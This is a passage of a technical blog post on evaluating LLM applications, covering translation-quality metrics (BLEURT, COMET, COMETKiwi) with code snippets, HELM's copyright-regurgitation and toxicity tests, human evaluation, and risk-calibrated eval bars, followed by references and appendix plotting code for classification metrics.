<span>scorer</span> <span>=</span> <span>score</span><span>.</span><span>BleurtScorer</span><span>(</span><span>checkpoint</span><span>)</span>
<span>scores</span> <span>=</span> <span>scorer</span><span>.</span><span>score</span><span>(</span><span>references</span><span>=</span><span>references</span><span>,</span> <span>candidates</span><span>=</span><span>candidates</span><span>)</span>
<span>assert</span> <span>isinstance</span><span>(</span><span>scores</span><span>,</span> <span>list</span><span>)</span> <span>and</span> <span>len</span><span>(</span><span>scores</span><span>)</span> <span>==</span> <span>1</span>
<span>print</span><span>(</span><span>scores</span><span>)</span>
</code></pre></div>

<p><strong><a href="https://aclanthology.org/2020.emnlp-main.213/" target="_blank">COMET</a> was introduced by Unbabel AI in 2020</strong> and takes a slightly different approach: In addition to the machine translation and reference translation, COMET also uses the source sentence. This allows the model to assess the translation quality in the context of the input, rather than just compare the output to a reference. Under the hood, COMET is based on the XLM-RoBERTa encoder, a multilingual version of the popular <a href="https://arxiv.org/abs/1907.11692" target="_blank">RoBERTa</a> model. Nonetheless, the methodology is flexible enough to work with other encoders too.</p>

<p>Unlike BLEURT, COMET doesn’t require a pre-finetuning phase on synthetic data. Instead, the model is directly finetuned on triplets of source, translation, and reference from human-annotated datasets. COMET-20 was trained on human ratings from WMT 2017 to 2019. Since then, newer variants such as <a href="https://aclanthology.org/2022.wmt-1.52/" target="_blank">COMET-22</a> and <a href="https://arxiv.org/abs/2310.10482" target="_blank">XCOMET</a> have been released.</p>

<p>To use it, we provide triplets of the source sentence (<code>src</code>), machine translation (<code>mt</code>), and reference translation (<code>ref</code>). An <a href="https://github.com/Unbabel/COMET" target="_blank">implementation</a> (Apache-2.0) is provided by Unbabel. The <a href="https://github.com/Unbabel/COMET/blob/master/LICENSE.models.md" target="_blank">COMET-20 model is also Apache-2.0</a> though more recent models are non-commercial use.</p>

<div><pre><code><span>from</span> <span>comet</span> <span>import</span> <span>download_model</span><span>,</span> <span>load_from_checkpoint</span>

<span>model_path</span> <span>=</span> <span>download_model</span><span>(</span><span>"Unbabel/wmt20-comet-da"</span><span>)</span>
<span>model</span> <span>=</span> <span>load_from_checkpoint</span><span>(</span><span>model_path</span><span>)</span>
<span>data</span> <span>=</span> <span>[</span>
    <span>{</span>
        <span>"src"</span><span>:</span> <span>"Boris Johnson teeters on edge of favour with Tory MPs"</span><span>,</span> 
        <span>"mt"</span><span>:</span> <span>"Boris Johnson ist bei Tory-Abgeordneten völlig in der Gunst"</span><span>,</span> 
        <span>"ref"</span><span>:</span> <span>"Boris Johnsons Beliebtheit bei Tory-MPs steht auf der Kippe"</span>
    <span>}</span>
<span>]</span>
<span>model_output</span> <span>=</span> <span>model</span><span>.</span><span>predict</span><span>(</span><span>data</span><span>,</span> <span>batch_size</span><span>=</span><span>8</span><span>,</span> <span>gpus</span><span>=</span><span>1</span><span>)</span>

<span>print</span> <span>(</span><span>model_output</span><span>.</span><span>scores</span><span>)</span>
<span>print</span> <span>(</span><span>model_output</span><span>.</span><span>system_score</span><span>)</span>
<span>print</span> <span>(</span><span>model_output</span><span>.</span><span>metadata</span><span>.</span><span>error_spans</span><span>)</span>
</code></pre></div>

<p><strong><a href="https://arxiv.org/abs/2209.06243" target="_blank">COMETKiwi</a> is a reference-free variant of COMET.</strong> It is an ensemble of two models: one finetuned on human ratings from WMT and another finetuned on human annotations from the <a href="https://arxiv.org/abs/2010.04480" target="_blank">Multilingual Quality Estimation and Post-Editing (MLQE-PE)</a> dataset. The key difference from the metrics above is that COMETKiwi can assess translation quality without needing a reference translation, eliminating the bottleneck of human ratings.</p>

<p>In <a href="https://aclanthology.org/2022.wmt-1.2/" target="_blank">WMT22</a>, COMETKiwi was the top-performance reference-free metric. In <a href="https://aclanthology.org/2023.wmt-1.51/" target="_blank">WMT23</a>, it was the top baseline alongside COMET and BLEURT. In addition, four of the top seven metrics in WMT23 were reference-free, suggesting that we may be able to reliably evaluate machine translations without the need for references soon.</p>

<p>To evaluate translations with COMETKiwi, use the <code>Unbabel/wmt22-cometkiwi-da</code> checkpoint with the same code as before. Unfortunately, it has a non-commercial license.</p>

<p><em>Beyond the three tasks of classification, summarization, and translation, I think it’s also helpful to consider evals of key defects such as content regurgitation and toxicity.</em></p>

<h2 id="copyright-regurgitation--near-exact-reproduction">Copyright: Regurgitation &amp; near-exact reproduction</h2>

<p><strong>Copyright regurgitation is the extent to which models reproduce copyrighted or licensed content from their pretraining data.</strong> While memorizing copyrighted content doesn’t necessarily imply legal risk, it could lead to “extraction attacks” where bad actors try to extract sensitive or proprietary information from the model.</p>

<p><a href="https://arxiv.org/abs/2211.09110" target="_blank">HELM (Holistic Evaluation of Language Models)</a> found that the worst offenders only regurgitated copyrighted content infrequently, with the longest common subsequence (LCS) between generated text and copyright content being <a href="https://crfm.stanford.edu/helm/classic/latest/#/groups/copyright_text" target="_blank">less than 0.1</a> for most models. In general, there was no copyright regurgitation at all. Nonetheless, some models were able to reproduce large spans of several Harry Potter books (davinci, anthropic-lm-v4) and “Oh, the Places You’ll Go” (opt, anthropic-lm-v4).</p>

<p>To evaluate copyright regurgitation, HELM compiled prompts from three sources: (i) 1,000 randomly sampled books from BooksCorpus, (ii) 20 bestselling books from BooksCorpus, and (iii) 2,000 random sampled functions from the Linux kernel source code. For (i), they used varying numbers of tokens from the beginning of randomly sampled paragraphs as prompts. For (ii), they used the first paragraph of each book. And for (iii), they used varying numbers of lines starting from the top of each function.</p>

<p>To quantify the overlap between model outputs and reference texts, they computed:</p>
<ul>
  <li>Exact regurgitation: The length of the longest common subsequence between the output and reference, normalized by the length of the input prompt</li>
  <li>Near-exact reproduction: The edit distance and edit similarity between the output and reference, normalized by the length of the input prompt.</li>
</ul>

<blockquote>
  <p>If you have an LLM app or feature that may return copyright material (e.g., codegen, media) and want to assess the risk, try HELM’s approach above. The first lines of Harry Potter will almost always work, given how common it is on the internet. Thus, use something from the middle of the books instead.</p>
</blockquote>

<h2 id="toxicity-realtoxicityprompts--bold">Toxicity: RealToxicityPrompts &amp; BOLD</h2>

<p><strong>Toxicity is the proportion of generated output that is classified as harmful, offensive, or inappropriate.</strong> In HELM, they used the <a href="https://perspectiveapi.com/" target="_blank">Perspective API</a> to measure toxicity where the threshold for toxicity is set at $p \geq 0.5$. This was computed at the instance level (i.e., for each generation) and then aggregated to get an overall toxicity score for each model.</p>

<p>In regular use cases such as summarization and question answering, most models showed very little evidence of toxicity. Nonetheless, when prompted with specifically designed “toxic prompts”, several models generated toxic outputs in <a href="https://crfm.stanford.edu/helm/classic/latest/#/groups/real_toxicity_prompts" target="_blank">at least 10% of cases</a>.</p>

<p><img src="https://eugeneyan.com/assets/toxicity.jpg" loading="lazy" title="Measure of toxicity in HELM" alt="Measure of toxicity in HELM"></p>
<p>Measure of toxicity in HELM</p>

<p>To create these toxic prompts, HELM used two datasets: RealToxicityPrompts and BOLD. <a href="https://arxiv.org/abs/2009.11462" target="_blank">RealToxicityPrompts</a> is based on OpenWebText, a collection of internet text that replicates the training data of gpt-2. The prompts are binned into four quantiles of toxicity based on their Perspective API scores. The idea is to start a sentence with a few words that could lead to toxic language and let the model generate the rest.</p>

<p>In contrast, <a href="https://arxiv.org/abs/2101.11718" target="_blank">BOLD (Bias in Open-Ended Language Generation Dataset)</a>, is drawn from Wikipedia. Each prompt takes the first six to nine words of an article that mentions a profession, gender, race, religion, or political ideology. Compared to RealToxicityPrompts, these prompts tend to be more neutral in tone.</p>

<div><pre><code><span># Example RealToxicityPrompt
</span><span>rtp_input</span> <span>=</span> <span>"So, I’m starting to think she’s full of ..."</span>

<span># Example BOLD prompt
</span><span>bold_input</span> <span>=</span> <span>"As a religion, Islam emphasizes the ..."</span>
</code></pre></div>

<p>The results show that some models do generate harmful or toxic content when given adversarial prompts like these. However, the researchers also note that “in many contexts encountered in deploying language models for legitimate use cases, we may find toxic generations to be quite rare”. That said, the definitions of toxicity also <a href="https://arxiv.org/abs/2304.12397" target="_blank">shift over time</a>.</p>

<blockquote>
  <p>If you’re concerned that your LLM application or feature may return toxic or biased text, test it with RealToxicityPrompts and/or BOLD. From experience though, recent LLMs do a good job at ensuring harmless output.</p>
</blockquote>

<h2 id="nonetheless-we-still-need-human-evaluation">Nonetheless, we still need human evaluation</h2>

<p><strong>While we’ve been focusing on automated evals, we should not forget the role of human evaluation.</strong> For complex tasks such as question answering, reasoning, and domain-specific knowledge, human evaluation is still the gold standard (for now). Furthermore, most automated evals rely on human annotations. For example, classification evals need human-labeled data as gold references while learned evals, such as factual consistency and translation quality, are finetuned on human judgments.</p>

<p>And even after we’ve collected an initial set of labels as ground truth or to finetune evaluation models, we’ll want to collect more labels—via active learning—to continuously improve. Taking the example of a classification eval, we can select instances to annotate based on the need to:</p>
<ul>
  <li>Increase precision: Select instances that the model predicts as positive with high probability and annotate them to identify false positives</li>
  <li>Increase recall: Select instances that the model predicts have low probability and check for false negatives</li>
  <li>Increase confidence: Select instances where the model is unsure (e.g., probability between 0.4 to 0.6) and collect human labels for finetuning</li>
</ul>

<p>This can also be applied to evals like factual consistency and relevance since they can be binary decisions. Another reason why simplifying evals to a binary metric helps.</p>

<p>If you’re looking for guidelines for human annotators, <a href="https://arxiv.org/abs/2307.03109">Chang et al.</a> suggest some key dimensions to consider:</p>
<ul>
  <li>Accuracy: Is the generated text factually correct and aligned with known information? This is closely tied to factual consistency.</li>
  <li>Relevance: Is the output appropriate and directly applicable to the task and input?</li>
  <li>Fluency: Is the text grammatically correct and readable? With modern LLMs, this is less of an issue than it used to be.</li>
  <li>Transparency: Does the model communicate its thought process and reasoning? Techniques like chain-of-thought help with this.</li>
  <li>Safety: Are there potential harms or unintended consequences from the generated text? This includes toxicity, bias, and misinformation.</li>
  <li>Human alignment: To what extent does the model’s output align with human values, preferences, and expectations?</li>
</ul>

<h2 id="calibrate-your-evaluation-bar-to-the-level-of-risk">Calibrate your evaluation bar to the level of risk</h2>

<p><strong>We should be pragmatic when setting our evaluation bar.</strong> It’s tempting to aim for near-perfect scores on every eval. After all, we want our models to be as accurate, safe, and reliable as possible. But the reality is that different use cases come with different levels of risk. Thus, our evaluation standards should be calibrated accordingly.</p>

<blockquote>
  <p>As a data point, the typical factual inconsistency/irrelevance rate is 5 - 10%, even after grounding via RAG and good prompt engineering. And from what I’ve learned from LLM providers, it may be prohibitively hard to go below 2%. (This is why we need factual inconsistency guardrails on LLM output.)</p>
</blockquote>

<p>We can think about this along the spectrum of internal vs. external facing applications, as well as whether we allow free-form user input. If we’re building a customer-facing medical or financial chatbot, we’ll probably want a higher bar for safety and accuracy. In contrast, if we’re using a language model for internal tasks like product classification or document summarization, the risks are lower as the outputs are only seen and used internally.</p>

<p>The internal vs. external split is common in industry: A <a href="https://a16z.com/generative-ai-enterprise-2024/" target="_blank">recent report by a16z</a> showed that companies are pushing internal applications of generative AI into production faster than human-in-the-loop (e.g., contract reviews) or external applications (e.g., chatbots). This allows them to start benefitting from LLMs while managing and assessing the risks in a controlled environment.</p>

<p><img src="https://eugeneyan.com/assets/a16z.jpg" loading="lazy" title="Internal-facing use cases have higher deployment rates than external" alt="Internal-facing use cases have higher deployment rates than external"></p>
<p>Internal-facing use cases have higher deployment rates than external</p>

<p><strong>The key is to balance between the potential benefits and risks of the application.</strong> If we’re working on a high-stakes application like medical diagnosis or financial advice, then we’ll want to set a high bar for evals and err on the side of caution. But for most scenarios, we’ll want to bias towards starting with a minimum lovable product and improving over time.</p>

<blockquote>
  <p><strong>Don’t be paralyzed by the need for perfection or zero risk, and as a result, succumb to Innovator’s Dilemma.</strong> Instead, set realistic, risk-adjusted evaluation criteria, start small, collect feedback, and iterate frequently.</p>
</blockquote>

<p>•&nbsp;•&nbsp;•</p>

<p>Having reliable evals is essential for building good LLM applications, and it doesn’t have to be painful. Here’s what I’d suggest for some task-specific evals:</p>
<ul>
  <li>Classification: Recall, Precision, ROC-AUC, Separation of Distributions</li>
  <li>Summarization: Factual consistency via NLI, Relevance via reward modeling</li>
  <li>Translation: Measure quality via chrF, BLEURT, COMET, COMETKiwi</li>
  <li>Toxicity: Test with adversarial prompts from RealToxicityPrompts and BOLD</li>
  <li>Copyright: Test with text from popular books and code</li>
</ul>

<p>I hope you found this write-up helpful in helping to evaluate your classification, summarization, and translation applications, as well as to assess the risk of copyright regurgitation and toxicity. Do you know of other resources for evaluating LLM-based applications? <a href="https://twitter.com/eugeneyan" target="_blank">Please reach out!</a></p>



<p>Thanks to <a href="https://twitter.com/HamelHusain" target="_blank">Hamel Husain</a>, <a href="https://twitter.com/vibhuuuus" target="_blank">Vibhu Sapra</a>, <a href="https://twitter.com/freddie_v4" target="_blank">Freddie Vargus</a>, <a href="https://twitter.com/sh_reya" target="_blank">Shreya Shankar</a>, <a href="https://twitter.com/nihit_desai" target="_blank">Nihit Desai</a>, <a href="https://twitter.com/BEBischof" target="_blank">Bryan Bischof</a>, and <a href="https://twitter.com/jxnlco" target="_blank">Jason Liu</a> for providing feedback on drafts and/or tolerating me whenever I <del>rant</del> talk about evals.</p>

<h2 id="further-reading">Further reading</h2>
<ul>
  <li><a href="https://github.com/run-llama/ai-engineer-workshop/blob/main/notebooks/02_evaluation.ipynb" target="_blank">Retrieval and end-to-end evaluation for RAG</a></li>
  <li><a href="https://github.com/jxnl/n-levels-of-rag" target="_blank">Evaluating the <em>n</em> levels of RAG</a></li>
  <li><a href="https://hamel.dev/blog/posts/evals/" target="_blank">Your AI Product Needs Evals</a></li>
</ul>

<h2 id="references">References</h2>
<ul>
  <li>Kryściński, Wojciech, et al. <a href="https://arxiv.org/abs/1908.08960" target="_blank">“Neural text summarization: A critical evaluation.”</a>&nbsp;<em>arXiv preprint arXiv:1908.08960</em>&nbsp;(2019).</li>
  <li>Zhang, Tianyi, et al. <a href="https://arxiv.org/abs/2301.13848" target="_blank">“Benchmarking large language models for news summarization.”</a>&nbsp;<em>Transactions of the Association for Computational Linguistics</em>&nbsp;12 (2024): 39-57.</li>
  <li>Liu, Yang, et al. <a href="https://arxiv.org/abs/2303.16634" target="_blank">“G-Eval: Nlg evaluation using gpt-4 with better human alignment.”</a>&nbsp;<em>arXiv preprint arXiv:2303.16634</em>(2023).</li>
  <li>Li, Junyi, et al. <a href="https://arxiv.org/abs/2305.11747" target="_blank">“HaluEval: A large-scale hallucination evaluation benchmark for large language models.”</a>&nbsp;<em>arXiv preprint arXiv:2305.11747</em>&nbsp;(2023).</li>
  <li>Tam, Derek, et al. <a href="https://arxiv.org/abs/2211.08412v1" target="_blank">“Evaluating the factual consistency of large language models through summarization.”</a>&nbsp;<em>arXiv preprint arXiv:2211.08412</em>&nbsp;(2022).</li>
  <li>Krishna, Kundan, et al. <a href="https://arxiv.org/abs/2305.14296" target="_blank">“USB: A unified summarization benchmark across tasks and domains.”</a>&nbsp;<em>arXiv preprint arXiv:2305.14296</em>&nbsp;(2023).</li>
  <li>Stiennon, Nisan, et al. <a href="https://arxiv.org/abs/2009.01325" target="_blank">“Learning to summarize with human feedback.”</a>&nbsp;<em>Advances in Neural Information Processing Systems</em>&nbsp;33 (2020): 3008-3021.</li>
  <li>Wu, Jeff, et al. <a href="https://arxiv.org/abs/2109.10862" target="_blank">“Recursively summarizing books with human feedback.”</a>&nbsp;<em>arXiv preprint arXiv:2109.10862</em>&nbsp;(2021).</li>
  <li>Shen, Yuchen, and Xiaojun Wan. <a href="https://arxiv.org/abs/2310.18122" target="_blank">“OpinSummEval: Revisiting automated evaluation for opinion summarization.”</a>&nbsp;<em>arXiv preprint arXiv:2310.18122</em>&nbsp;(2023).</li>
  <li>Chu, Eric, and Peter Liu. <a href="https://arxiv.org/abs/1810.05739" target="_blank">“MeanSum: a neural model for unsupervised multi-document abstractive summarization.”</a> International conference on machine learning. PMLR, 2019.</li>
  <li>Yuan, Weizhe, Graham Neubig, and Pengfei Liu. <a href="https://arxiv.org/abs/2106.11520" target="_blank">“BARTScore: Evaluating generated text as text generation.”</a>&nbsp;<em>Advances in Neural Information Processing Systems</em>&nbsp;34 (2021): 27263-27277.</li>
  <li>Lewis, Mike, et al. <a href="https://arxiv.org/abs/1910.13461" target="_blank">“BART: Denoising sequence-to-sequence pre-training for natural language generation, translation, and comprehension.”</a>&nbsp;<em>arXiv preprint arXiv:1910.13461</em>&nbsp;(2019).</li>
  <li>Linkov, Denys, <a href="https://www.voiceflow.com/blog/how-much-do-chatgpt-versions-affect-real-world-performance" target="_blank">“How much do ChatGPT versions affect real world performance?”</a> <em>https://voiceflow.com</em>, (2024).</li>
  <li>Freitag, Markus, et al. <a href="https://aclanthology.org/2021.wmt-1.73/" target="_blank">“Results of the WMT21 metrics shared task: Evaluating metrics with expert-based human evaluations on TED and news domain.”</a>&nbsp;<em>Proceedings of the Sixth Conference on Machine Translation</em>. 2021.</li>
  <li>Freitag, Markus, et al. <a href="https://aclanthology.org/2022.wmt-1.2/" target="_blank">“Results of WMT22 metrics shared task: Stop using BLEU–neural metrics are better and more robust.”</a>&nbsp;<em>Proceedings of the Seventh Conference on Machine Translation (WMT)</em>. 2022.</li>
  <li>Freitag, Markus, et al. <a href="https://aclanthology.org/2023.wmt-1.51/" target="_blank">“Results of WMT23 metrics shared task: Metrics might be guilty but references are not innocent.”</a>&nbsp;<em>Proceedings of the Eighth Conference on Machine Translation</em>. 2023.</li>
  <li>Popović, Maja. <a href="https://aclanthology.org/W15-3049/" target="_blank">“chrF: character n-gram F-score for automatic MT evaluation.”</a>&nbsp;<em>Proceedings of the tenth workshop on statistical machine translation</em>. 2015.</li>
  <li>Post, Matt. <a href="https://arxiv.org/abs/1804.08771" target="_blank">“A call for clarity in reporting BLEU scores.”</a>&nbsp;<em>arXiv preprint arXiv:1804.08771</em>&nbsp;(2018).</li>
  <li>Sellam, Thibault, Dipanjan Das, and Ankur P. Parikh. <a href="https://arxiv.org/abs/2004.04696" target="_blank">“BLEURT: Learning robust metrics for text generation.”</a>&nbsp;<em>arXiv preprint arXiv:2004.04696</em>&nbsp;(2020).</li>
  <li>Devlin, Jacob, et al. <a href="https://arxiv.org/abs/1810.04805" target="_blank">“BERT: Pre-training of deep bidirectional transformers for language understanding.”</a>&nbsp;<em>arXiv preprint arXiv:1810.04805</em>&nbsp;(2018).</li>
  <li>Rei, Ricardo, et al. <a href="https://arxiv.org/abs/2009.09025" target="_blank">“COMET: A neural framework for MT evaluation.”</a>&nbsp;<em>arXiv preprint arXiv:2009.09025</em>&nbsp;(2020).</li>
  <li>Liu, Yinhan, et al. <a href="https://arxiv.org/abs/1907.11692" target="_blank">“RoBERTa: A robustly optimized BERT pretraining approach.”</a>&nbsp;<em>arXiv preprint arXiv:1907.11692</em>&nbsp;(2019).</li>
  <li>Rei, Ricardo, et al. <a href="https://aclanthology.org/2022.wmt-1.52/" target="_blank">“COMET-22: Unbabel-IST 2022 submission for the metrics shared task.”</a>&nbsp;<em>Proceedings of the Seventh Conference on Machine Translation (WMT)</em>. 2022.</li>
  <li>Guerreiro, Nuno M., et al. <a href="https://arxiv.org/abs/2310.10482" target="_blank">“xCOMET: Transparent machine translation evaluation through fine-grained error detection.”</a>&nbsp;<em>arXiv preprint arXiv:2310.10482</em>&nbsp;(2023).</li>
  <li>Rei, Ricardo, et al. <a href="https://arxiv.org/abs/2209.06243" target="_blank">“CometKiwi: IST-unbabel 2022 submission for the quality estimation shared task.”</a>&nbsp;<em>arXiv preprint arXiv:2209.06243</em>&nbsp;(2022).</li>
  <li>Fomicheva, Marina, et al. <a href="https://arxiv.org/abs/2010.04480" target="_blank">“MLQE-PE: A multilingual quality estimation and post-editing dataset.”</a>&nbsp;<em>arXiv preprint arXiv:2010.04480</em>&nbsp;(2020).</li>
  <li>Liang, Percy, et al. <a href="https://arxiv.org/abs/2211.09110" target="_blank">“Holistic evaluation of language models.”</a>&nbsp;<em>arXiv preprint arXiv:2211.09110</em>&nbsp;(2022).</li>
  <li>Gehman, Samuel, et al. <a href="https://arxiv.org/abs/2009.11462" target="_blank">“RealToxicityPrompts: Evaluating neural toxic degeneration in language models.”</a>&nbsp;<em>arXiv preprint arXiv:2009.11462</em>&nbsp;(2020).</li>
  <li>Dhamala, Jwala, et al. <a href="https://arxiv.org/abs/2101.11718" target="_blank">“Bold: Dataset and metrics for measuring biases in open-ended language generation.”</a>&nbsp;<em>Proceedings of the 2021 ACM conference on fairness, accountability, and transparency</em>. 2021.</li>
  <li>Pozzobon, Luiza, et al. <a href="https://arxiv.org/abs/2304.12397">“On the challenges of using black-box apis for toxicity evaluation in research.”</a> arXiv preprint arXiv:2304.12397 (2023).</li>
  <li>Chang, Yupeng, et al. <a href="https://arxiv.org/abs/2307.03109" target="_blank">“A survey on evaluation of large language models.”</a>&nbsp;<em>ACM Transactions on Intelligent Systems and Technology</em>&nbsp;(2023).</li>
</ul>

<hr>
<h2 id="appendix">Appendix</h2>

<h3 id="what-about-reference-based-evals-for-summarization">What about reference-based evals for summarization?</h3>

<p>The most commonly used summarization evals compare generated summaries to a gold reference summary via n-gram matching (e.g., ROUGE, METEOR) or embedding similarity (e.g., BERTScore, MoverScore). <strong>However, I’ve found them impractical because:</strong></p>
<ul>
  <li>They require gold references which are a bottleneck: Thus, we need to collect gold summaries for each new summarization task. This typically involves writing guidelines, training annotators, and continuously auditing for quality.</li>
  <li>References may be poor quality: <a href="https://arxiv.org/abs/2007.12626">Fabbri et al (2021)</a> and <a href="https://arxiv.org/abs/2301.13848">Zhang et al. (2023)</a> found generated summaries to surpass reference summaries in CNN/DailyMail and XSUM. Thus, it does not make sense to evaluate generations against poorer references.</li>
  <li>Poor separation of distributions: While academic papers often report decent correlation between these metrics and human annotations, empirically, their variance from ground truth is too high and the separation of distributions is too close to be used.</li>
</ul>

<h3 id="what-about-llm-based-evals-for-summarization">What about LLM-based evals for summarization?</h3>

<p>A commonly cited LLM-based eval is <a href="https://arxiv.org/abs/2303.16634">G-Eval</a>. It applies LLMs with chain-of-thought and a form-filling paradigm to evaluate summaries. However, while its reported Spearman correlation with human judgements surpasses previous SOTA evaluators, empirically, it’s unreliable (low recall), costly (at least double the token count), and has poor sensitivity (to nuanced inconsistencies).</p>

<p>Furthermore, <a href="https://arxiv.org/abs/2305.11747">HaluEval</a>, a hallucination evaluation benchmark, found similar results: Models such as ChatGPT and Claude 2 could not distinguish between factual and hallucinated summaries—their accuracy was only 53.8% - 58.5%. (Unfortunately, they didn’t provide metrics for recall and precision.)</p>

<h3 id="code-to-compute-the-classification-metric-graphs">Code to compute the classification metric graphs</h3>

<div><pre><code><span>def</span> <span>kl_divergence</span><span>(</span><span>p</span><span>,</span> <span>q</span><span>):</span>
    <span>return</span> <span>np</span><span>.</span><span>sum</span><span>(</span><span>p</span> <span>*</span> <span>np</span><span>.</span><span>log</span><span>(</span><span>p</span> <span>/</span> <span>q</span><span>))</span>

<span>def</span> <span>js_divergence</span><span>(</span><span>p</span><span>,</span> <span>q</span><span>):</span>
    <span>m</span> <span>=</span> <span>0.5</span> <span>*</span> <span>(</span><span>p</span> <span>+</span> <span>q</span><span>)</span>
    <span>return</span> <span>0.5</span> <span>*</span> <span>(</span><span>kl_divergence</span><span>(</span><span>p</span><span>,</span> <span>m</span><span>)</span> <span>+</span> <span>kl_divergence</span><span>(</span><span>q</span><span>,</span> <span>m</span><span>))</span>

<span>def</span> <span>visualize_preds</span><span>(</span><span>y</span><span>,</span> <span>y_pred</span><span>,</span> <span>model_name</span><span>):</span>
    <span>df</span> <span>=</span> <span>pd</span><span>.</span><span>DataFrame</span><span>({</span><span>'label'</span><span>:</span> <span>y</span><span>,</span> <span>'pred_proba'</span><span>:</span> <span>y_pred</span><span>})</span>

    <span># Compute ROCAUC metrics
</span>    <span>rocauc</span> <span>=</span> <span>roc_auc_score</span><span>(</span><span>df</span><span>[</span><span>'label'</span><span>],</span> <span>df</span><span>[</span><span>'pred_proba'</span><span>])</span>
    <span>fpr</span><span>,</span> <span>tpr</span><span>,</span> <span>thresholds</span> <span>=</span> <span>roc_curve</span><span>(</span><span>df</span><span>[</span><span>'label'</span><span>],</span> <span>df</span><span>[</span><span>'pred_proba'</span><span>])</span>
    <span>baseline</span> <span>=</span> <span>np</span><span>.</span><span>sum</span><span>(</span><span>df</span><span>[</span><span>'label'</span><span>])</span> <span>/</span> <span>len</span><span>(</span><span>df</span><span>)</span>

    <span># Compute PRAUC metrics
</span>    <span>prauc</span> <span>=</span> <span>average_precision_score</span><span>(</span><span>df</span><span>[</span><span>'label'</span><span>],</span> <span>df</span><span>[</span><span>'pred_proba'</span><span>])</span>
    <span>prec</span><span>,</span> <span>rec</span><span>,</span> <span>thresholds</span> <span>=</span> <span>precision_recall_curve</span><span>(</span><span>df</span><span>[</span><span>'label'</span><span>],</span> <span>df</span><span>[</span><span>'pred_proba'</span><span>])</span>

    <span># Split into consistent and inconsistent for prob distribution
</span>    <span>inconsistent</span> <span>=</span> <span>df</span><span>[</span><span>df</span><span>[</span><span>'label'</span><span>]</span> <span>==</span> <span>1</span><span>].</span><span>reset_index</span><span>(</span><span>drop</span><span>=</span><span>True</span><span>)</span>
    <span>consistent</span> <span>=</span> <span>df</span><span>[</span><span>df</span><span>[</span><span>'label'</span><span>]</span> <span>==</span> <span>0</span><span>].</span><span>reset_index</span><span>(</span><span>drop</span><span>=</span><span>True</span><span>)</span>
    <span>js_div</span> <span>=</span> <span>js_divergence</span><span>(</span><span>inconsistent</span><span>[</span><span>'pred_proba'</span><span>],</span> <span>consistent</span><span>[</span><span>'pred_proba'</span><span>])</span>

    <span># Set up plots
</span>    <span>fig</span><span>,</span> <span>(</span><span>ax0</span><span>,</span> <span>ax1</span><span>,</span> <span>ax2</span><span>,</span> <span>ax3</span><span>)</span> <span>=</span> <span>plt</span><span>.</span><span>subplots</span><span>(</span><span>1</span><span>,</span> <span>4</span><span>,</span> <span>figsize</span><span>=</span><span>(</span><span>13</span><span>,</span> <span>3</span><span>),</span> <span>tight_layout</span><span>=</span><span>True</span><span>)</span>
    <span>title_font_size</span> <span>=</span> <span>10</span>
    <span>fig</span><span>.</span><span>suptitle</span><span>(</span><span>f</span><span>'</span><span>{</span><span>model_name</span><span>}</span><span>'</span><span>,</span> <span>fontsize</span><span>=</span><span>title_font_size</span><span>+</span><span>2</span><span>,</span> <span>y</span><span>=</span><span>1</span><span>)</span>

    <span># Plot ROC
</span>    <span>ax0</span><span>.</span><span>grid</span><span>()</span>
    <span>ax0</span><span>.</span><span>plot</span><span>(</span><span>fpr</span><span>,</span> <span>tpr</span><span>,</span> <span>label</span><span>=</span><span>'ROC'</span><span>)</span>
    <span>ax0</span><span>.</span><span>plot</span><span>([</span><span>0</span><span>,</span> <span>1</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>1</span><span>],</span> <span>label</span><span>=</span><span>'Random chance'</span><span>,</span> <span>linestyle</span><span>=</span><span>'--'</span><span>,</span> <span>color</span><span>=</span><span>'red'</span><span>)</span>
    <span>ax0</span><span>.</span><span>set_xlabel</span><span>(</span><span>'False positive rate'</span><span>)</span>
    <span>ax0</span><span>.</span><span>set_ylabel</span><span>(</span><span>'True positive rate'</span><span>)</span>
    <span>ax0</span><span>.</span><span>set_title</span><span>(</span><span>f</span><span>'ROC AUC = </span><span>{</span><span>rocauc</span><span>:</span><span>.</span><span>2</span><span>f</span><span>}</span><span>'</span><span>,</span> <span>fontsize</span><span>=</span><span>title_font_size</span><span>)</span>
    <span>ax0</span><span>.</span><span>legend</span><span>()</span>

    <span># Plot PRAUC
</span>    <span>ax1</span><span>.</span><span>grid</span><span>()</span>
    <span>ax1</span><span>.</span><span>plot</span><span>(</span><span>rec</span><span>,</span> <span>prec</span><span>,</span> <span>label</span><span>=</span><span>'PRAUC'</span><span>)</span>
    <span>ax1</span><span>.</span><span>axhline</span><span>(</span><span>y</span><span>=</span><span>baseline</span><span>,</span> <span>label</span><span>=</span><span>'Baseline'</span><span>,</span> <span>linestyle</span><span>=</span><span>'--'</span><span>,</span> <span>color</span><span>=</span><span>'red'</span><span>)</span>
    <span>ax1</span><span>.</span><span>set_xlabel</span><span>(</span><span>'Recall'</span><span>)</span>
    <span>ax1</span><span>.</span><span>set_ylabel</span><span>(</span><span>'Precision'</span><span>)</span>
    <span>ax1</span><span>.</span><span>set_xlim</span><span>((</span><span>-</span><span>0.1</span><span>,</span> <span>1.1</span><span>))</span>
    <span>ax1</span><span>.</span><span>set_ylim</span><span>((</span><span>-</span><span>0.1</span><span>,</span> <span>1.1</span><span>))</span>
    <span>ax1</span><span>.</span><span>set_title</span><span>(</span><span>f</span><span>'PR AUC = </span><span>{</span><span>prauc</span><span>:</span><span>.</span><span>2</span><span>f</span><span>}</span><span>'</span><span>,</span> <span>fontsize</span><span>=</span><span>title_font_size</span><span>)</span>

    <span># Plot Precision &amp; Recall
</span>    <span>ax2</span><span>.</span><span>grid</span><span>()</span>
    <span>ax2</span><span>.</span><span>plot</span><span>(</span><span>thresholds</span><span>,</span> <span>prec</span><span>[</span><span>1</span><span>:],</span> <span>color</span><span>=</span><span>'red'</span><span>,</span> <span>label</span><span>=</span><span>'Precision'</span><span>)</span>
    <span>ax2</span><span>.</span><span>plot</span><span>(</span><span>thresholds</span><span>,</span> <span>rec</span><span>[</span><span>1</span><span>:],</span> <span>color</span><span>=</span><span>'blue'</span><span>,</span> <span>label</span><span>=</span><span>'Recall'</span><span>)</span>
    <span>ax2</span><span>.</span><span>invert_xaxis</span><span>()</span>
    <span>ax2</span><span>.</span><span>set_xlabel</span><span>(</span><span>'Thresholds (1.0 - 0.0)'</span><span>)</span>
    <span>ax2</span><span>.</span><span>set_ylabel</span><span>(</span><span>'Precision / Recall'</span><span>)</span>
    <span>ax2</span><span>.</span><span>set_xlim</span><span>((</span><span>1.1</span><span>,</span> <span>-</span><span>0.1</span><span>))</span>
